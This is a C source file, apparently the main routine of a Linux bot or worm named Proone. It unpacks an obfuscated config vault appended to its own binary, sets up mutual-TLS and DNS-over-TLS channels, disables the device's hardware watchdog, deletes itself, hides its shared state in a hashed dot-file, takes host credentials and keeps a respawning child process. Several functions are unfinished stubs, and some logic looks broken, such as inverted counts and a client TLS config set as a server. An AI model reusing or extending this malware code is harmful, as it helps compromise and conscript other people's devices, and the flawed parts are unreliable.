#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/wait.h>
#include <elf.h>

#include <mbedtls/sha256.h>
#include <mbedtls/base64.h>

#include "config.h"
#include "proone.h"
#include "protocol.h"
#include "util_rt.h"
#include "dvault.h"
#include "llist.h"
#include "mbedtls.h"


struct prne_global prne_g;
struct prne_shared_global *prne_s_g = NULL;

sigset_t ss_exit, ss_all;

static prne_worker_t wkr_arr[2];
static size_t wkr_cnt;


static void alloc_resolv (void) {
	prne_resolv_ns_pool_t pool4, pool6;
	size_t i, len, cnt;
	const uint8_t *bin;

	prne_resolv_init_ns_pool(&pool4);
	prne_resolv_init_ns_pool(&pool6);

	bin = prne_dvault_get_bin(PRNE_DATA_KEY_RESOLV_NS_IPV4, &len);
	prne_dbgast(len != 0 && len % 16 == 0);
	cnt = len * 16;

	if (!prne_resolv_alloc_ns_pool(&pool4, cnt)) {
		goto END;
	}
	for (i = 0; i < cnt; i += 1) {
		memcpy(pool4.arr[i].addr.addr, bin + i * 16, 16);
		pool4.arr[i].addr.ver = PRNE_IPV_4;
		pool4.arr[i].port = 853;
	}

	bin = prne_dvault_get_bin(PRNE_DATA_KEY_RESOLV_NS_IPV6, &len);
	prne_dbgast(len != 0 && len % 16 == 0);
	cnt = len * 16;

	if (!prne_resolv_alloc_ns_pool(&pool6, cnt)) {
		goto END;
	}
	for (i = 0; i < cnt; i += 1) {
		memcpy(pool6.arr[i].addr.addr, bin + i * 16, 16);
		pool6.arr[i].addr.ver = PRNE_IPV_6;
		pool6.arr[i].port = 853;
	}

	prne_g.resolv = prne_alloc_resolv(
		wkr_arr + wkr_cnt,
		&prne_g.ssl.rnd,
		pool4, pool6);
	if (prne_g.resolv != NULL) {
		wkr_cnt += 1;
		pool4.ownership = false;
		pool6.ownership = false;
	}

END:
	prne_dvault_reset();
	prne_resolv_free_ns_pool(&pool4);
	prne_resolv_free_ns_pool(&pool6);
}

static void alloc_htbt (void) {
	// TODO
}

static void alloc_workers (void) {
	for (size_t i = 0; i < sizeof(wkr_arr)/sizeof(prne_worker_t); i += 1) {
		prne_init_worker(wkr_arr + i);
	}
	alloc_resolv();
	alloc_htbt();
}

static void free_workers (void) {
	for (size_t i = 0; i < wkr_cnt; i += 1) {
		prne_free_worker(wkr_arr + i);
	}
	prne_g.resolv = NULL;
}

static void seed_ssl_rnd (const bool use_bent) {
	static const uint8_t BENTPY[] = PRNE_BUILD_ENTROPY;
	static const size_t BENTPY_SIZE = sizeof(BENTPY);
	int mret;

	if (use_bent) {
		mret = mbedtls_ctr_drbg_seed(
			&prne_g.ssl.rnd,
			mbedtls_entropy_func,
			&prne_g.ssl.entpy,
			BENTPY,
			BENTPY_SIZE);
	}
	else {
		mret = -1;
	}

	if (mret != 0) {
		mbedtls_ctr_drbg_seed(
			&prne_g.ssl.rnd,
			mbedtls_entropy_func,
			&prne_g.ssl.entpy,
			NULL,
			0);
	}
}

/* proone_main()
* Actual main where all dangerous stuff happens.
* Most of long-lived variables are declared static so there's little stack
* allocation involvedsince stack allocation can cause page fault.
*/
static int proone_main (void) {
	static int caught_sig;

	prne_assert(pth_init());
	prne_g.main_pth = pth_self();

	seed_ssl_rnd(true);
	alloc_workers();

	for (size_t i = 0; i < wkr_cnt; i += 1) {
		wkr_arr[i].pth = pth_spawn(PTH_ATTR_DEFAULT, wkr_arr[i].entry, wkr_arr[i].ctx);
		prne_assert(wkr_arr[i].pth != NULL);
	}

	do {
		prne_assert(pth_sigwait(&ss_all, &caught_sig) == 0);
		switch (caught_sig) {
		case SIGCHLD: // Not my child
		case SIGINT: // Probably Ctrl + C. Wait for the parent to send SIGTERM.
		case SIGPIPE:
			continue;
		}
	} while (false);
	sigprocmask(SIG_UNBLOCK, &ss_exit, NULL);

	for (size_t i = 0; i < wkr_cnt; i += 1) {
		prne_fin_worker(wkr_arr + i);
	}
	for (size_t i = 0; i < wkr_cnt; i += 1) {
		prne_assert(pth_join(wkr_arr[i].pth, NULL));
		prne_free_worker(wkr_arr + i);
	}

	free_workers();

	pth_kill();

	return 0;
}

static void delete_myself (const char *arg0) {
#if defined(PRNE_DEBUG)
	unlink(arg0);
#endif
}

static void disasble_watchdog (void) {
#ifndef PRNE_DEBUG
	static const char *watchdog_paths[] = {
		"/dev/watchdog",
		"/dev/misc/watchdog"
	};
	static const int one = 1;
	int fd;
	size_t i;

	for (i = 0; i < sizeof(watchdog_paths) / sizeof(const char*); i += 1) {
		if ((fd = open(watchdog_paths[i], O_RDWR)) >= 0) {
			ioctl(fd, 0x80045704, &one);
			prne_close(fd);
			break;
		}
	}
#endif
}

static void set_env (void) {
	// environment set up function calls in here
}

static void setup_dvault (void) {
	prne_g.m_dvault = (uint8_t*)prne_malloc(1, prne_g.dvault_size);
	memcpy(prne_g.m_dvault, prne_g.m_exec_dvault, prne_g.dvault_size);

	prne_init_dvault(prne_g.m_dvault);
}

static void init_proone (const char *self) {
	int fd;
#if PRNE_HOST_WORDSIZE == 64
	static const unsigned char EXPTD_CLASS = 2;
#define ELF_EHDR_TYPE Elf64_Ehdr
#elif PRNE_HOST_WORDSIZE == 32
	static const unsigned char EXPTD_CLASS = 1;
#define ELF_EHDR_TYPE Elf32_Ehdr
#else
	#error "FIXME!"
#endif
#if PRNE_HOST_ENDIAN == PRNE_ENDIAN_LITTLE
	static const unsigned char EXPTD_DATA = 1;
#elif PRNE_HOST_ENDIAN == PRNE_ENDIAN_BIG
	static const unsigned char EXPTD_DATA = 2;
#else
	#error "FIXME!"
#endif
	ELF_EHDR_TYPE *elf;
	uint_fast32_t dvault_ofs, binarch_ofs, binarch_size;
	off_t file_size;

	set_env();

	fd = open(self, O_RDONLY);
	prne_assert(fd >= 0);
	file_size = lseek(fd, 0, SEEK_END);
	prne_assert(file_size >= (off_t)sizeof(ELF_EHDR_TYPE));
	prne_g.m_exec = (const uint8_t*)mmap(
		NULL,
		file_size,
		PROT_READ,
		MAP_SHARED,
		fd,
		0);
	prne_close(fd);
	prne_assert(prne_g.m_exec != MAP_FAILED);

	// Use header
	elf = (ELF_EHDR_TYPE*)prne_g.m_exec;
	prne_assert(
		elf->e_ident[EI_MAG0] == ELFMAG0 &&
		elf->e_ident[EI_MAG1] == ELFMAG1 &&
		elf->e_ident[EI_MAG2] == ELFMAG2 &&
		elf->e_ident[EI_MAG3] == ELFMAG3);
	prne_assert(elf->e_ident[EI_CLASS] == EXPTD_CLASS);
	prne_assert(elf->e_ident[EI_DATA] == EXPTD_DATA);

	prne_g.exec_size = elf->e_shoff + (elf->e_shentsize * elf->e_shnum);
	prne_g.exec_size = prne_salign_next(prne_g.exec_size, PRNE_BIN_ALIGNMENT);
	prne_massert(
		prne_g.exec_size + 8 <= (size_t)file_size,
		"No appendix!");

	// Read sizes
	prne_g.dvault_size =
		(uint_fast16_t)prne_g.m_exec[prne_g.exec_size + 0] << 8 |
		(uint_fast16_t)prne_g.m_exec[prne_g.exec_size + 1] << 0;

	dvault_ofs = prne_salign_next(prne_g.exec_size, PRNE_BIN_ALIGNMENT) + 8;
	binarch_ofs = dvault_ofs + prne_salign_next(
		prne_g.dvault_size,
		PRNE_BIN_ALIGNMENT);
	binarch_size = file_size - binarch_ofs;

	// Load dvault
	prne_assert(dvault_ofs + prne_g.dvault_size <= (size_t)file_size);
	prne_g.m_exec_dvault = prne_g.m_exec + dvault_ofs;
	setup_dvault();

	if (binarch_size > 0) {
		prne_g.bin_ready = prne_index_bin_archive(
			prne_g.m_exec + binarch_ofs,
			binarch_size,
			&prne_g.bin_archive) == PRNE_PACK_RC_OK;
	}
	if (!prne_g.bin_ready) {
		prne_dbgpf("* This executable has no binary archive!\n");
	}
#undef ELF_EHDR_TYPE
}

static void deinit_proone (void) {
	prne_deinit_dvault();
	prne_free(prne_g.m_dvault);
	prne_g.m_dvault = NULL;
}

static void load_ssl_conf (void) {
#define BREAKIF_ERR(f) if (mret != 0) {\
	prne_dbgpf("%s() returned %d\n", f, mret);\
	break;\
}
	static const char *ALP_LIST[] = { PRNE_HTBT_TLS_ALP, NULL };
	size_t dvlen = 0;
	int mret;
	const uint8_t *data;

	do {
		data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_CA_CRT, &dvlen);
		mret = mbedtls_x509_crt_parse(&prne_g.ssl.ca, data, dvlen);
		BREAKIF_ERR("mbedtls_x509_crt_parse");

		do {
			// Server stuff
			mret = mbedtls_ssl_config_defaults(
				&prne_g.s_ssl.conf,
				MBEDTLS_SSL_IS_SERVER,
				MBEDTLS_SSL_TRANSPORT_STREAM,
				MBEDTLS_SSL_PRESET_DEFAULT);
			BREAKIF_ERR("mbedtls_ssl_config_defaults");
			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_S_CRT, &dvlen);
			mret = mbedtls_x509_crt_parse(&prne_g.s_ssl.crt, data, dvlen);
			BREAKIF_ERR("mbedtls_x509_crt_parse");
			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_S_KEY, &dvlen);
			mret = mbedtls_pk_parse_key(
				&prne_g.s_ssl.pk,
				data,
				dvlen,
				NULL,
				0);
			BREAKIF_ERR("mbedtls_pk_parse_key");
			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_DH, &dvlen);
			mret = mbedtls_dhm_parse_dhm(&prne_g.s_ssl.dhm, data, dvlen);
			BREAKIF_ERR("mbedtls_dhm_parse_dhm");
			mret = mbedtls_ssl_conf_own_cert(
				&prne_g.s_ssl.conf,
				&prne_g.s_ssl.crt,
				&prne_g.s_ssl.pk);
			BREAKIF_ERR("mbedtls_ssl_conf_own_cert");
			mret = mbedtls_ssl_conf_dh_param_ctx(
				&prne_g.s_ssl.conf,
				&prne_g.s_ssl.dhm);
			BREAKIF_ERR("mbedtls_ssl_conf_dh_param_ctx");
			mret = mbedtls_ssl_conf_alpn_protocols(
				&prne_g.s_ssl.conf,
				ALP_LIST);
			BREAKIF_ERR("mbedtls_ssl_conf_alpn_protocols");
			prne_g.s_ssl.ready = true;
		} while (false);

		do {
			// Client stuff
			mret = mbedtls_ssl_config_defaults(
				&prne_g.c_ssl.conf,
				MBEDTLS_SSL_IS_SERVER,
				MBEDTLS_SSL_TRANSPORT_STREAM,
				MBEDTLS_SSL_PRESET_DEFAULT);
			BREAKIF_ERR("mbedtls_ssl_config_defaults");
			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_C_CRT, &dvlen);
			mret = mbedtls_x509_crt_parse(&prne_g.c_ssl.crt, data, dvlen);
			BREAKIF_ERR("mbedtls_x509_crt_parse");
			data = prne_dvault_get_bin(PRNE_DATA_KEY_X509_C_KEY, &dvlen);
			mret = mbedtls_pk_parse_key(
				&prne_g.c_ssl.pk,
				data,
				dvlen,
				NULL,
				0);
			BREAKIF_ERR("mbedtls_pk_parse_key");
			mret = mbedtls_ssl_conf_own_cert(
				&prne_g.c_ssl.conf,
				&prne_g.c_ssl.crt,
				&prne_g.c_ssl.pk);
			BREAKIF_ERR("mbedtls_ssl_conf_own_cert");
			mret = mbedtls_ssl_conf_alpn_protocols(
				&prne_g.c_ssl.conf,
				ALP_LIST);
			BREAKIF_ERR("mbedtls_ssl_conf_alpn_protocols");
			prne_g.c_ssl.ready = true;
		} while (false);
	} while (false);
	prne_dvault_reset();

	// set mutual auth
	// ignore expired cert (system wall clock might not be set)
	if (prne_g.s_ssl.ready) {
		mbedtls_ssl_conf_rng(
			&prne_g.s_ssl.conf,
			mbedtls_ctr_drbg_random,
			&prne_g.ssl.rnd);
		mbedtls_ssl_conf_ca_chain(
			&prne_g.s_ssl.conf,
			&prne_g.ssl.ca, NULL);
		mbedtls_ssl_conf_authmode(
			&prne_g.s_ssl.conf,
			MBEDTLS_SSL_VERIFY_REQUIRED);
		mbedtls_ssl_conf_verify(
			&prne_g.s_ssl.conf,
			prne_mbedtls_x509_crt_verify_cb,
			NULL);
	}
	if (prne_g.c_ssl.ready) {
		mbedtls_ssl_conf_rng(
			&prne_g.c_ssl.conf,
			mbedtls_ctr_drbg_random,
			&prne_g.ssl.rnd);
		mbedtls_ssl_conf_ca_chain(
			&prne_g.c_ssl.conf,
			&prne_g.ssl.ca,
			NULL);
		mbedtls_ssl_conf_authmode(
			&prne_g.c_ssl.conf,
			MBEDTLS_SSL_VERIFY_REQUIRED);
		mbedtls_ssl_conf_verify(
			&prne_g.c_ssl.conf,
			prne_mbedtls_x509_crt_verify_cb,
			NULL);
		mbedtls_ssl_conf_min_version(
			&prne_g.c_ssl.conf,
			MBEDTLS_SSL_MAJOR_VERSION_3,
			MBEDTLS_SSL_MINOR_VERSION_0);
	}
#undef BREAKIF_ERR
}

static bool try_lock_file (const int fd) {
	return flock(fd, LOCK_EX | LOCK_NB) == 0;
}

static bool format_shared_global (const int fd) {
	uint8_t rev;

	if (read(fd, &rev, 1) != 1) {
		return false;
	}

	switch (rev) {
	// Future format update code goes here
	case 0:
		return
			lseek(fd, 0, SEEK_END) >= (off_t)sizeof(struct prne_shared_global);
	}

	return false;
}

static void skel_shared_global (struct prne_shared_global *skel) {
	prne_memzero(skel, sizeof(struct prne_shared_global));
	// Future code for new shared_global format goes here
	skel->rev = 0;
}

/* Hash following to get name for shared global backing file:
*	The salt value "proone"
*	Boot ID
*	Hostname
* (In this order!)
*
* Note that the shared global is meant to be persistent only for current boot.
* It will be lost after the machine restart.
*/
static void hash_shg_name (char *out) {
	mbedtls_sha256_context h;
	uint8_t m[32];
	size_t dv_len;
	const uint8_t *dv_dat;
	int fd = -1, f_ret;

	prne_memzero(m, sizeof(m));
	mbedtls_sha256_init(&h);

// TRY
	if (mbedtls_sha256_starts_ret(&h, 0) != 0) {
		goto CATCH;
	}

	dv_dat = prne_dvault_get_bin(PRNE_DATA_KEY_SHG_SALT, &dv_len);
	if (mbedtls_sha256_update_ret(&h, dv_dat, dv_len) != 0) {
		goto CATCH;
	}
	prne_dvault_reset();

	if (mbedtls_sha256_update_ret(&h, prne_g.boot_id, 16) != 0) {
		goto CATCH;
	}

	fd = open("/etc/hostname", O_RDONLY);
	if (fd >= 0) {
		uint8_t buf[256];

		f_ret = read(fd, buf, sizeof(buf));
		if (f_ret > 0) {
			if (mbedtls_sha256_update_ret(&h, buf, f_ret) != 0) {
				goto CATCH;
			}
		}
		prne_close(fd);
		fd = -1;
	}

	mbedtls_sha256_finish_ret(&h, m);

CATCH:
	prne_dvault_reset();
	mbedtls_sha256_free(&h);
	out[0] = '/';
	out[1] = '.';
	prne_uuid_tostr(m, out + 2);
	out[38] = 0;
	prne_close(fd);
}

static bool try_open_sg (const char *path, const bool shm, int *ret) {
	*ret = shm ?
		shm_open(path, O_RDWR, 0600) :
		open(path, O_RDWR, 0600);
	if (*ret >= 0) {
		if (!try_lock_file(*ret)) {
			return false;
		}
		if (format_shared_global(*ret)) {
			return true;
		}
		else {
			close(*ret);
			*ret = -1;
		}
	}

	*ret = shm ?
		shm_open(path, O_RDWR | O_CREAT | O_TRUNC, 0600) :
		open(path, O_RDWR | O_CREAT | O_TRUNC, 0600);
	if (*ret >= 0) {
		struct prne_shared_global skel;

		skel_shared_global(&skel);

		if (!(try_lock_file(*ret) &&
			write(*ret, &skel, sizeof(skel)) == sizeof(skel)))
		{
			close(*ret);
			*ret = -1;
		}
	}

	return true;
}

/* init_shared_global ()
*
* Returns true if there's no other process detected. Returns false otherwise
* to indicate that the program should not progress further.
*/
static bool init_shared_global (void) {
	int fd = -1;
	char fname[39];
	char path[38 + prne_op_max(sizeof("/tmp"), sizeof("."))];
	bool ret = true;

	/*
	* 1. Try creating shm, which is the most favourable
	* 2. Try creating a file in /tmp, which is memory backed on most env
	* 3. Try creating a file in current wd
	*
	* ... just don't use shared memory if all of these fail
	*/
	hash_shg_name(fname);

	do {
		ret = try_open_sg(fname, true, &fd);
		if (!ret) {
			goto END;
		}
		if (fd >= 0) {
			break;
		}

		strcpy(path, "/tmp");
		strcat(path, fname);
		ret = try_open_sg(path, false, &fd);
		if (!ret) {
			goto END;
		}
		if (fd >= 0) {
			break;
		}

		strcpy(path, ".");
		strcat(path, fname);
		ret = try_open_sg(path, false, &fd);
		if (!ret) {
			goto END;
		}
		if (fd >= 0) {
			break;
		}

		goto END;
	} while (false);

	prne_s_g = (struct prne_shared_global*)mmap(
		NULL,
		sizeof(struct prne_shared_global),
		PROT_READ | PROT_WRITE,
		MAP_SHARED,
		fd,
		0);
	if (prne_s_g == MAP_FAILED) {
		prne_s_g = NULL;
		prne_dbgperr("* Failed to initialise shared global");
	}
	else {
		prne_s_g->ny_bin_path[0] = 0;
	}

END:
	prne_close(fd);
	prne_dvault_reset();

	return ret;
}

static void deinit_shared_global (void) {
	if (prne_s_g != NULL) {
		munmap(prne_s_g, sizeof(struct prne_shared_global));
		prne_s_g = NULL;
	}
	prne_close(prne_g.shm_fd);
	prne_g.shm_fd = -1;
}

static void init_ids (void) {
	char line[37];
	int fd = -1;

	if (mbedtls_ctr_drbg_random(
		&prne_g.ssl.rnd,
		prne_g.instance_id,
		sizeof(prne_g.instance_id)) != 0)
	{
		prne_memzero(prne_g.instance_id, sizeof(prne_g.instance_id));
	}

	prne_memzero(prne_g.boot_id, 16);
	do { // fake loop
		fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY);
		if (fd < 0) {
			break;
		}

		if (read(fd, line, 36) != 36) {
			break;
		}
		line[36] = 0;

		if (!prne_uuid_fromstr(line, prne_g.boot_id)) {
			break;
		}
	} while (false);
	prne_close(fd);
}

static void set_host_credential (const char *str) {
	if (prne_s_g == NULL) {
		return;
	}

	// TODO: test
	mbedtls_base64_decode(
		prne_s_g->host_cred_data,
		sizeof(prne_s_g->host_cred_data),
		&prne_s_g->host_cred_len,
		(const unsigned char*)str,
		strlen(str));
}

static void run_ny_bin (void) {
	sigset_t old_ss;
	bool has_ss;

	// Clean the house for the new image.
	// Free any resource that survives exec() call.
	deinit_shared_global();
	has_ss = sigprocmask(SIG_UNBLOCK, &ss_all, &old_ss) == 0;

	// TODO

	// exec() failed
	// Restore previous condifion
	if (has_ss) {
		sigprocmask(SIG_BLOCK, &old_ss, NULL);
	}
	init_shared_global();
}


int main (const int argc, const char **args) {
	static int exit_code;
	static bool loop = true;

	sigemptyset(&ss_exit);
	sigemptyset(&ss_all);
	sigaddset(&ss_exit, SIGINT);
	sigaddset(&ss_exit, SIGTERM);
	sigaddset(&ss_all, SIGINT);
	sigaddset(&ss_all, SIGTERM);
	sigaddset(&ss_all, SIGCHLD);
	sigaddset(&ss_all, SIGPIPE);

	prne_g.parent_start = prne_gettime(CLOCK_MONOTONIC);
	prne_g.resolv = NULL;
	prne_g.parent_pid = getpid();
	prne_g.child_pid = 0;
	prne_g.shm_fd = -1;
	prne_g.bin_ready = false;
	prne_g.is_child = false;
	prne_init_bin_archive(&prne_g.bin_archive);
	mbedtls_x509_crt_init(&prne_g.ssl.ca);
	prne_mbedtls_entropy_init(&prne_g.ssl.entpy);
	mbedtls_ctr_drbg_init(&prne_g.ssl.rnd);
	mbedtls_ssl_config_init(&prne_g.s_ssl.conf);
	mbedtls_x509_crt_init(&prne_g.s_ssl.crt);
	mbedtls_pk_init(&prne_g.s_ssl.pk);
	mbedtls_dhm_init(&prne_g.s_ssl.dhm);
	prne_g.s_ssl.ready = false;
	mbedtls_ssl_config_init(&prne_g.c_ssl.conf);
	mbedtls_x509_crt_init(&prne_g.c_ssl.crt);
	mbedtls_pk_init(&prne_g.c_ssl.pk);
	prne_g.c_ssl.ready = false;

	init_proone(args[0]);

	/* inits that need outside resources. IN THIS ORDER! */
	seed_ssl_rnd(false);
	load_ssl_conf();
	init_ids();
	if (!init_shared_global()) {
		prne_dbgpf("*** Another instance detected.\n");
		exit_code = 1;
		goto END;
	}
	delete_myself(args[0]);
	disasble_watchdog();


	// load data from stdin
	if (argc > 1) {
		set_host_credential(args[1]);
	}

	// done with the terminal
	close(STDIN_FILENO);
#ifndef PRNE_DEBUG
	// Some stupid library can use these
	close(STDOUT_FILENO);
	close(STDERR_FILENO);
#endif

	sigprocmask(SIG_BLOCK, &ss_all, NULL);

	// main loop
	while (loop) {
		prne_g.child_pid = fork();

		if (prne_g.child_pid > 0) {
			static int status;
			static bool has_ny_bin;
			static int caught_signal;

			prne_dbgpf("* Child: %d\n", prne_g.child_pid);

			do {
				prne_assert(sigwait(&ss_all, &caught_signal) == 0);

				switch (caught_signal) {
				case SIGINT:
				case SIGTERM:
					// Exit requested. Notify the child and wait for it to exit.
					loop = false;
					sigprocmask(SIG_UNBLOCK, &ss_exit, NULL);
					kill(prne_g.child_pid, SIGTERM);
					continue;
				case SIGCHLD:
					prne_assert(waitpid(prne_g.child_pid, &status, WNOHANG) == prne_g.child_pid);
					break;
				case SIGPIPE:
					prne_dbgpf("** Parent received SIGPIPE. WHAT???\n");
					continue;
				}
			} while (false);

			if (prne_s_g != NULL) {
				has_ny_bin = strlen(prne_s_g->ny_bin_path) > 0;

				if (!(WIFEXITED(status) && WEXITSTATUS(status) == 0)) {
					prne_s_g->crash_cnt += 1;
				}
			}

			if (WIFEXITED(status)) {
				prne_dbgpf("* Child process %d exited with code %d!\n", prne_g.child_pid, WEXITSTATUS(status));
				if (WEXITSTATUS(status) == 0) {
					if (has_ny_bin) {
						prne_dbgpf("* Detected new bin. Attempting to exec()\n");
						run_ny_bin();
						// run_ny_bin() returns if fails
						prne_dbgperr("** run_ny_bin() failed");
					}
					break;
				}
			}
			else if (WIFSIGNALED(status)) {
				prne_dbgpf("** Child process %d received signal %d!\n", prne_g.child_pid, WTERMSIG(status));
			}

			if (has_ny_bin) {
				unlink(prne_s_g->ny_bin_path);
				prne_memzero(prne_s_g->ny_bin_path, sizeof(prne_s_g->ny_bin_path));
			}

			sleep(1);
		}
		else {
			prne_close(prne_g.shm_fd);
			prne_g.shm_fd = -1;
			prne_g.is_child = true;
			prne_g.child_start = prne_gettime(CLOCK_MONOTONIC);

			exit_code = proone_main();
			break;
		}
	}
	prne_g.child_pid = 0;

END:
	prne_free_bin_archive(&prne_g.bin_archive);
	prne_g.bin_ready = false;

	mbedtls_ssl_config_free(&prne_g.s_ssl.conf);
	mbedtls_x509_crt_free(&prne_g.s_ssl.crt);
	mbedtls_pk_free(&prne_g.s_ssl.pk);
	mbedtls_dhm_free(&prne_g.s_ssl.dhm);
	prne_g.s_ssl.ready = false;
	mbedtls_ssl_config_free(&prne_g.c_ssl.conf);
	mbedtls_x509_crt_free(&prne_g.c_ssl.crt);
	mbedtls_pk_free(&prne_g.c_ssl.pk);
	prne_g.c_ssl.ready = false;
	mbedtls_x509_crt_free(&prne_g.ssl.ca);
	mbedtls_ctr_drbg_free(&prne_g.ssl.rnd);
	mbedtls_entropy_free(&prne_g.ssl.entpy);

	deinit_shared_global();
	deinit_proone();

	return exit_code;
}
